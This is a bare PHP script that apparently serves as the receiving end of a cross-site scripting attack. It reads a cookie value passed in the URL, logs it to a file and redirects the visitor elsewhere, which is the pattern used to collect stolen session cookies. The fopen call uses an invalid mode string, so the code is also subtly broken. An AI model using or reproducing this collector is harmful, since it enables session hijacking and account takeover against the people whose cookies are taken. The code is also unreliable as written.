<?php
$cookie = $_GET["cookie"];
$file = fopen('log.txt', 'cookie');
fwrite($file, $cookie . "\n\n");
header("Location: http://abc.com/?s=hello");
die();
?> 